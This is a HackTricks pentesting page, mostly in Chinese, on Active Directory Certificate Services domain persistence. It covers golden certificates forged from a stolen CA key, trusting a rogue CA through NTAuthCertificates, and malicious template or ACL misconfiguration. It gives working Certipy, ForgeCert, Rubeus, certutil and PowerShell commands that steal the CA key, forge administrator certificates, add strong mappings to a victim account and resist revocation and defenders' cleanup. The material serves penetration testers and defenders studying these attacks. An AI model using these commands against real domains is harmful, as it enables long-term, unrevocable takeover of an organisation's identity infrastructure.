# AD CS 域持久化

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中共享的域持久化技术的总结。查看该文档以获取更多细节。**

## 使用被盗 CA 证书伪造证书 (Golden Certificate) - DPERSIST1

如何判断一个证书是否为 CA 证书？

如果满足以下若干条件，则可以判断该证书为 CA 证书：

- 该证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或者在操作系统支持的情况下由 TPM/HSM 等硬件保护。
- 证书的 Issuer 和 Subject 字段均与 CA 的 distinguished name 匹配。
- CA 证书中专有地存在一个 "CA Version" 扩展。
- 证书缺少 Extended Key Usage (EKU) 字段。

要提取此证书的私钥，受支持的方法是在 CA 服务器上通过内置 GUI 使用 `certsrv.msc` 工具。尽管如此，这个证书与系统中存储的其他证书并无区别；因此，也可以使用诸如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 之类的方法来提取。

证书和私钥也可以使用 Certipy 获得，命令如下：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA 证书及其以 `.pfx` 格式的私钥后，可以使用诸如 [ForgeCert](https://github.com/GhostPack/ForgeCert) 等工具来生成有效证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 目标用户必须在 Active Directory 中处于活动状态并能够进行身份验证，证书伪造流程才能成功。对像 krbtgt 这样的特殊账户伪造证书无效。

这个伪造的证书将在指定的截止日期之前以及在根 CA 证书有效期间保持**有效**（通常为 5 到 **10+ 年**）。它同样对**机器**有效，因此结合 **S4U2Self**，攻击者可以在 CA 证书有效期间**在任何域内机器上保持持久性**。\
此外，使用此方法生成的**证书无法被撤销**，因为 CA 并不知道它们的存在。

### 在强证书映射强制执行下的操作（2025+）

自 2025 年 2 月 11 日（在 KB5014754 推出之后），域控制器在证书映射方面默认启用 **Full Enforcement**。实际上这意味着你的伪造证书必须满足以下之一：

- 包含与目标账户的强绑定（例如，SID 安全扩展），或
- 与目标对象的 `altSecurityIdentities` 属性上的强显式映射配对。

一种可靠的持久化方法是铸造一个与被盗 Enterprise CA 链接的伪造证书，然后向受害主体添加一个强显式映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意事项
- 如果你能制作包含 SID 安全扩展的 forged certificates，这些证书即使在 Full Enforcement 下也会隐式映射。否则，优先使用明确的强映射。参见 [account-persistence](account-persistence.md) 获取有关显式映射的更多信息。
- 撤销对防御者在这里没有帮助：forged certificates 在 CA 数据库中未知，因此无法被撤销。

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` 对象被定义为在其 `cacertificate` 属性中包含一个或多个 **CA certificates**，Active Directory (AD) 使用该属性。验证过程中，**domain controller** 会检查 `NTAuthCertificates` 对象中是否存在与正在进行身份验证的 **certificate** 的 Issuer 字段中指定的 **CA** 相匹配的条目。如果找到匹配项，则继续进行身份验证。

攻击者可以将自签名 CA 证书添加到 `NTAuthCertificates` 对象，前提是他们控制该 AD 对象。通常，只有 **Enterprise Admin** 组的成员，以及 **Domain Admins** 或 **Administrators**（位于 **forest root’s domain** 中）被授予修改此对象的权限。他们可以使用 `certutil.exe` 编辑 `NTAuthCertificates` 对象，命令为 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`，或者使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

通过对 **security descriptor modifications of AD CS** 组件进行修改以实现 **persistence** 的机会很多。在 “[Domain Escalation](domain-escalation.md)” 一节中描述的修改可以由具有提升权限的攻击者恶意实施。这包括向敏感组件添加“control rights”（例如 WriteOwner/WriteDACL 等），例如：

- **CA 服务器的 AD 计算机对象**
- **CA 服务器的 RPC/DCOM 服务**
- 位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 下的任何 **后代 AD 对象或容器**（例如 Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象等）
- 默认或由组织委派有权控制 AD CS 的 **AD 组**（例如内置的 Cert Publishers 组及其任一成员）

一个恶意实现的示例是：具有 **elevated permissions** 的攻击者向默认的 **`User`** 证书模板添加 **`WriteOwner`** 权限，并将攻击者设为该权限的主体。为利用此，攻击者会先将 **`User`** 模板的所有权更改为自己。随后，会在模板上将 **`mspki-certificate-name-flag`** 设置为 **1** 以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许请求者在请求中提供 Subject Alternative Name。之后，攻击者可以使用该 **template** 进行 **enroll**，选择一个 **domain administrator** 名称作为替代名称，并使用获取的证书以 DA 身份进行身份验证。

攻击者为了长期保持域内 persistence 可能设置的实际选项（完整细节和检测见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这会使类似 ESC1 的路径保持可利用。
- 允许签发具备认证能力证书的模板 DACL 或设置（例如添加 Client Authentication EKU、启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以便在防御方尝试清理时持续重新引入流氓发行者。

> [!TIP]
> 在 KB5014754 之后的强化环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）配合使用，可以确保即便 DC 强制执行强映射，您签发或伪造的证书仍然可用。

## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
